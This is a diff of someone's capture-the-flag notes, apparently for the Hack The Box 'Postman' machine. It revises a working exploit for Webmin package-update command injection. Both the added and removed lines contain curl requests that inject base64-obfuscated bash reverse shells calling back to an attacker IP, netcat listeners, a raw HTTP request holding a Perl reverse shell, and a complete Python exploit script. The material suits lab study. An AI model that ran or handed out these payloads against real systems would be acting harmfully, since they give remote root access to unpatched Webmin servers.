@@ -259,12 +259,16 @@ curl -i -k -b 'testing=1' \
   --data-binary 'user=Matt&pass=computer2008' \
   https://10.10.10.160:10000/session_login.cgi
 
-# exploit
-curl -i -k -X POST \
-  -H 'Referer: https://10.10.10.160:10000/package-updates/?xnavigation=1' \
+# IMPORTANT for curl+bash: see "--data-binary $'<STRING_PAYLOAD>'"
+# https://www.gnu.org/software/bash/manual/html_node/ANSI_002dC-Quoting.html
+# https://unix.stackexchange.com/questions/115612/understanding-two-flags-and-a-dollar-sign-in-a-curl-command
+
+# send payload format
+curl -i -sS -k -X POST \
+  -H 'Referer: https://10.10.10.160:10000/package-updates/update.cgi?xnavigation=1' \
   -H 'Content-Type: application/x-www-form-urlencoded' \
-  -b 'sid=<SID>' \
-  --data-binary '<PAYLOAD>' \
+  -b 'testing=1; sid=<SID>' \
+  --data-binary $'<STRING_PAYLOAD>' \
   https://10.10.10.160:10000/package-updates/update.cgi
 
 # https://unix.stackexchange.com/questions/159253/decoding-url-encoding-percent-encoding
@@ -282,209 +286,71 @@ bash -c "{ping,-c,1,127.0.0.1}"
 # verify intercept packets locally
 tcpdump -i lo -n icmp
 
-# e.g. tun0 10.10.14.15
+# e.g. tun0 10.10.14.14
 ifconfig
 # verify intercept packets
 tcpdump -i tun0 -n icmp
 ping 10.10.10.160
-bash -c "{ping,-c,1,10.10.14.15}"
+bash -c "{ping,-c,1,10.10.14.14}"
 
-# NOT WORKING
-urlencode 'u=acl/apt&u= | bash -c "{ping,-c,1,10.10.14.15}"&ok_top=Update Selected Packages'
-# output
-u%3Dacl%2Fapt%26u%3D+%7C+bash+-c+%22%7Bping%2C-c%2C1%2C10.10.14.15%7D%22%26ok_top%3DUpdate+Selected+Packages
+# $'<STRING_PAYLOAD>' test ping
+$'u=acl/apt&u= | bash -c "{ping,-c,1,10.10.14.14}"&ok_top=Update Selected Packages'
 
-# NOT WORKING - ICMP issue?
-# sample
-echo -n 'ping -c 1 10.10.14.15' | base64
-# equivalent
-{echo,-n,cGluZyAtYyAxIDEwLjEwLjE0LjE1,}|{,base64,-d}|{bash,-i}
-# payload
-u=acl/apt&u= | bash -c "{echo,-n,cGluZyAtYyAxIDEwLjEwLjE0LjE1,}|{,base64,-d}|{bash,-i}"&ok_top=Update Selected Packages
-# urlencoded
-u%3Dacl%2Fapt%26u%3D+%7C+bash+-c+%22%7Becho%2C-n%2CcGluZyAtYyAxIDEwLjEwLjE0LjE1%2C%7D%7C%7B%2Cbase64%2C-d%7D%7C%7Bbash%2C-i%7D%22%26ok_top%3DUpdate+Selected+Packages
+# encode ping
+echo -n 'ping -c 1 10.10.14.14' | base64
+# exec encoded ping
+{echo,-n,cGluZyAtYyAxIDEwLjEwLjE0LjE0,}|{,base64,-d}|{bash,-i}
 
-curl -i -s -k -X POST \
-  -H 'Referer: https://10.10.10.160:10000/package-updates/?xnavigation=1' \
-  -H 'Content-Type: application/x-www-form-urlencoded' \
-  -b 'sid=792e4eef5a988488627d8e7b5c20d5ac' \
-  --data-binary 'u%3Dacl%2Fapt%26u%3D+%7C+bash+-c+%22%7Becho%2C-n%2CcGluZyAtYyAxIDEwLjEwLjE0LjE1%2C%7D%7C%7B%2Cbase64%2C-d%7D%7C%7Bbash%2C-i%7D%22%26ok_top%3DUpdate+Selected+Packages' \
-  https://10.10.10.160:10000/package-updates/update.cgi
+# $'<STRING_PAYLOAD>' test encoded ping (both valid)
+$'u=acl/apt&u= | bash -c "{echo,-n,cGluZyAtYyAxIDEwLjEwLjE0LjE0,}|{,base64,-d}|{bash,-i}"&ok_top=Update Selected Packages'
+$'u=acl/apt&u= | bash -c "{echo,cGluZyAtYyAxIDEwLjEwLjE0LjE0}|{base64,-d}|{bash,-i}"&ok_top=Update Selected Packages'
 
 # http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
 
-# reverse shell
-# bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
-# e.g. tun0 10.10.14.15
-bash -i >& /dev/tcp/10.10.14.15/4242 0>&1
-# test
-nc -lvnp 4242
+# listen
+nc -lvnp 4444
+# example reverse shell e.g. tun0 10.10.14.14
+bash -i >& /dev/tcp/10.10.14.14/4444 0>&1
 
-# replace spaces with commas inside bash command (no reason)
-# same encoding ???
-echo -n 'bash,-i,>&,/dev/tcp/10.10.14.15/4242,0>&1' | base64
-echo -n 'bash -i >& /dev/tcp/10.10.14.15/4242 0>&1' | base64
-# output
-YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xNS80MjQyIDA+JjE=
-# test decoding
-echo -n 'YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xNS80MjQyIDA+JjE=' | base64 -d
-# equivalent (no spaces, no pipes)
-# replace spaces with commas
-{echo,-n,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xNS80MjQyIDA+JjE=,}|{,base64,-d}
+# encode reverse shell
+echo -n 'bash -i >& /dev/tcp/10.10.14.14/4444 0>&1' | base64
+# alternatively replace spaces with commas inside bash command (equivalent)
+echo -n 'bash,-i,>&,/dev/tcp/10.10.14.14/4444,0>&1' | base64
+# output (with spaces, no commas)
+YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xNC80NDQ0IDA+JjE=
 
-# test
-{echo,-n,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xNS80MjQyIDA+JjE=,}|{,base64,-d}|{bash,-i}
-nc -lvnp 4242
+# verify encoding
+echo -n 'YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xNC80NDQ0IDA+JjE=' | base64 -d
+# listen
+nc -lvnp 4444
+# exec encoded reverse shell
+{echo,-n,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xNC80NDQ0IDA+JjE=,}|{,base64,-d}|{bash,-i}
 
-u=acl/apt&u= | bash -c "{echo,-n,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xNS80MjQyIDA+JjE=,}|{,base64,-d}|{bash,-i}"&ok_top=Update Selected Packages
-# output urcurl -i -k -X POST \
-  -H 'Referer: https://10.10.10.160:10000/package-updates/?xnavigation=1' \
-  -H 'Content-Type: application/x-www-form-urlencoded' \
-  -b 'sid=fb9f0fecee9ab8bb758871783abbd460' \
-  --data-binary 'u%3Dacl%2Fapt%26u%3D+%7C+bash+-c+%22%7Becho%2C-n%2CYmFzaCAtaSA%2BJiAvZGV2L3RjcC8xMC4xMC4xNC4xNS80MjQyIDA%2BJjE%3D%2C%7D%7C%7B%2Cbase64%2C-d%7D%7C%7Bbash%2C-i%7D%22%26ok_top%3DUpdate+Selected+Packages' \
-  https://10.10.10.160:10000/package-updates/update.cgilencode
-u%3Dacl%2Fapt%26u%3D+%7C+bash+-c+%22%7Becho%2C-n%2CYmFzaCAtaSA%2BJiAvZGV2L3RjcC8xMC4xMC4xNC4xNS80MjQyIDA%2BJjE%3D%2C%7D%7C%7B%2Cbase64%2C-d%7D%7C%7Bbash%2C-i%7D%22%26ok_top%3DUpdate+Selected+Packages
+# $'<STRING_PAYLOAD>' test reverse shell: corrupted
+$'u=acl/apt&u= | bash -c "{echo,-n,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xNC80NDQ0IDA+JjE=,}|{,base64,-d}|{bash,-i}"&ok_top=Update Selected Packages'
 
-# plus
-u=acl/apt&u=+|+bash+-c+"{echo,-n,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xNS80MjQyIDA+JjE=,}|{,base64,-d}|{bash,-i}"&ok_top=Update Selected Packages
-u%3Dacl%2Fapt%26u%3D+%7C+bash+-c+%22%7Becho%2C-n%2CYmFzaCAtaSA%2BJiAvZGV2L3RjcC8xMC4xMC4xNC4xNS80MjQyIDA%2BJjE%3D%2C%7D%7C%7B%2Cbase64%2C-d%7D%7C%7Bbash%2C-i%7D%22%26ok_top%3DUpdate+Selected+Packages
+# $'<STRING_PAYLOAD>' test reverse shell: fix corrupted chars in base64 payload
+# replace + in base64 with %2B
+# replace = in base64 with %3D
+$'u=acl/apt&u= | bash -c "{echo,-n,YmFzaCAtaSA%2BJiAvZGV2L3RjcC8xMC4xMC4xNC4xNC80NDQ0IDA%2BJjE%3D,}|{,base64,-d}|{bash,-i}"&ok_top=Update Selected Packages'
+$'u=acl/apt&u= | bash -c "{echo,YmFzaCAtaSA%2BJiAvZGV2L3RjcC8xMC4xMC4xNC4xNC80NDQ0IDA%2BJjE%3D}|{base64,-d}|{bash,-i}"&ok_top=Update Selected Packages'
+```
 
-curl -i -L -k -X POST \
-  -H 'Referer: https://10.10.10.160:10000/package-updates/?xnavigation=1' \
-  -H 'Content-Type: application/x-www-form-urlencoded' \
-  -b 'sid=3e6d1f2635ddbb7306f15d8ec0afb4ba' \
-  --data-binary 'u%3Dacl%2Fapt%26u%3D+%7C+bash+-c+%22%7Becho%2C-n%2CYmFzaCAtaSA%2BJiAvZGV2L3RjcC8xMC4xMC4xNC4xNS80MjQyIDA%2BJjE%3D%2C%7D%7C%7B%2Cbase64%2C-d%7D%7C%7Bbash%2C-i%7D%22%26ok_top%3DUpdate+Selected+Packages' \
-  https://10.10.10.160:10000/package-updates/update.cgi
+Final exploit
+```bash
+# listen
+nc -lvnp 4444
 
-nc -lvnp 4242
----
-
-# >>> root
-
-# metasploit 4444
-echo -n 'bash -i >& /dev/tcp/10.10.14.8/4444 0>&1' | base64
-# outputu=acl/apt&u= | bash -c "{echo,-n,<ENCODED_PAYLOAD>,}|{,base64,-d}|{bash,-i}"&ok_top=Update Selected Packages
-YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC44LzQ0NDQgMD4mMQ==
-# test
-echo -n 'YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC44LzQ0NDQgMD4mMQ==' | base64 -d
-# test
-{echo,-n,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC44LzQ0NDQgMD4mMQ==,}|{,base64,-d}
-
-# template
-u=acl/apt&u= | bash -c "{echo,-n,<ENCODED_PAYLOAD>,}|{,base64,-d}|{bash,-i}"&ok_top=Update Selected Packages
-
-urlencode 'u=acl/apt&u= | bash -c "{echo,-n,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC44LzQ0NDQgMD4mMQ==,}|{,base64,-d}|{bash,-i}"&ok_top=Update Selected Packages'
-# output
-u%3Dacl%2Fapt%26u%3D+%7C+bash+-c+%22%7Becho%2C-n%2CYmFzaCAtaSA%2BJiAvZGV2L3RjcC8xMC4xMC4xNC44LzQ0NDQgMD4mMQ%3D%3D%2C%7D%7C%7B%2Cbase64%2C-d%7D%7C%7Bbash%2C-i%7D%22%26ok_top%3DUpdate+Selected+Packages
-# test
-urldecode 'u%3Dacl%2Fapt%26u%3D+%7C+bash+-c+%22%7Becho%2C-n%2CYmFzaCAtaSA%2BJiAvZGV2L3RjcC8xMC4xMC4xNC44LzQ0NDQgMD4mMQ%3D%3D%2C%7D%7C%7B%2Cbase64%2C-d%7D%7C%7Bbash%2C-i%7D%22%26ok_top%3DUpdate+Selected+Packages'
-
-# ^^^ NOT WORKING - URL encoding issue
-
-# get SID
+# get sid from header
 curl -i -k -b 'testing=1' \
   --data-binary 'user=Matt&pass=computer2008' \
   https://10.10.10.160:10000/session_login.cgi
 
-#>>> urlencode currupt the exploit
-# replace space with +
-# replace / with %2F
-# replace + in base64 with %2B
-# replace = in base64 with %3D
-
-# exploit
-curl -i -k -X POST \
-  -H 'Referer: https://10.10.10.160:10000/package-updates/?xnavigation=1' \
-  -b 'sid=36dfa33151b241b381a49f13d4863bbc' \
-  --data-binary 'u=acl%2Fapt&u=+|+bash+-c+"{echo,-n,YmFzaCAtaSA%2BJiAvZGV2L3RjcC8xMC4xMC4xNC44LzQ0NDQgMD4mMQ%3D%3D,}|{,base64,-d}|{bash,-i}"&ok_top=Update Selected Packages' \
+# open reverse shell on 10.10.14.14:4444
+curl -i -sS -k -X POST \
+  -H 'Referer: https://10.10.10.160:10000/package-updates/update.cgi?xnavigation=1' \
+  -H 'Content-Type: application/x-www-form-urlencoded' \
+  -b 'testing=1; sid=<SID>' \
+  --data-binary $'u=acl/apt&u= | bash -c "{echo,YmFzaCAtaSA%2BJiAvZGV2L3RjcC8xMC4xMC4xNC4xNC80NDQ0IDA%2BJjE%3D}|{base64,-d}|{bash,-i}"&ok_top=Update Selected Packages' \
   https://10.10.10.160:10000/package-updates/update.cgi
-
-nc -lvnp 4444
-
-root@Postman:/usr/share/webmin/package-updates/# cat /root/root.txt
-cat /root/root.txt
-```
-
----
-
-POST /session_login.cgi HTTP/1.1
-Host: 10.10.10.160:10000
-User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)
-Cookie: testing=1
-Content-Type: application/x-www-form-urlencoded
-Content-Length: 33
-Connection: close
-
-page=&user=Matt&pass=computer2008
-
----
-
-POST /proc/index_tree.cgi HTTP/1.1
-Host: 10.10.10.160:10000
-User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)
-Cookie: sid=b4906df6cbd67571d11e57d3ee9671a9
-Referer: https://10.10.10.160:10000/sysinfo.cgi?xnavigation=1
-Content-Type: application/x-www-form-urlencoded
-Content-Length: 0
-Connection: close
-
----
-
-POST /package-updates/update.cgi HTTP/1.1
-Host: 10.10.10.160:10000
-User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)
-Cookie: sid=b4906df6cbd67571d11e57d3ee9671a9
-Referer: https://10.10.10.160:10000/package-updates/?xnavigation=1
-Content-Type: application/x-www-form-urlencoded
-Content-Length: 440
-Connection: close
-
-u=acl%2Fapt&u=%20%7C%20bash%20-c%20%22%7becho%2ccGVybCAtTUlPIC1lICckcD1mb3JrO2V4aXQsaWYoJHApO2ZvcmVhY2ggbXkgJGtleShrZXlzICVFTlYpe2lmKCRFTlZ7JGtleX09fi8oLiopLyl7JEVOVnska2V5fT0kMTt9fSRjPW5ldyBJTzo6U29ja2V0OjpJTkVUKFBlZXJBZGRyLCIxMC4xMC4xNC4xNTo0NDQ0Iik7U1RESU4tPmZkb3BlbigkYyxyKTskfi0%2bZmRvcGVuKCRjLHcpO3doaWxlKDw%2bKXtpZigkXz1%2bIC8oLiopLyl7c3lzdGVtICQxO319Oyc%3d%7d%7c%7bbase64%2c-d%7d%7c%7bbash%2c-i%7d%22&ok_top=Update+Selected+Packages
-
----
-
-https://lillox.info/postman-machine.html
-
-```
-pip install requests
-python exploit.py
-```
-
-```python
-#!/usr/bin/env python3
-
-import requests
-import urllib3
-urllib3.disable_warnings()
-import base64
-
-url="https://10.10.10.160:10000/"
-username="Matt"
-password="computer2008"
-
-# Retrieve a valid session ID
-request={'user':username, 'pass':password}
-result=requests.post(url + "session_login.cgi", data=request, cookies={"testing": "1"}, verify=False, allow_redirects=False)
-if "sid" in result.headers['Set-Cookie']:
-    sid = result.headers['Set-Cookie'].replace('\n', '').split('=')[1].split(";")[0].strip()
-    print("Found a valid SID: {}".format(sid))
-else:
-    print("Something gone wrong...exiting")
-    exit(1)
-# Payload
-cmd= "bash -i >& /dev/tcp/10.10.14.8/4444 0>&1"
-cmd_base64=base64.b64encode(bytes(cmd, 'utf-8')).decode("utf-8")
-payload=' | bash -c "{echo,'+cmd_base64+'}|{base64,-d}|{bash,-i}"'
-print(payload)
-# Build the request
-request={'u':['acl/apt', payload]}
-headers= {'Connection': 'close','referer': url+"package-updates/?xnavigation=1"}
-try:
-  requests.post(url+"package-updates/update.cgi",data=request, cookies={"sid":sid}, verify=False, allow_redirects=False, headers=headers, timeout=10)
-#except requests.exceptions.HTTPError as e:
-#    print (e.response.text)
-except:
-    print("Something gone wrong...exiting")
-    exit(1)
-print("Check the nc listener")
 ```
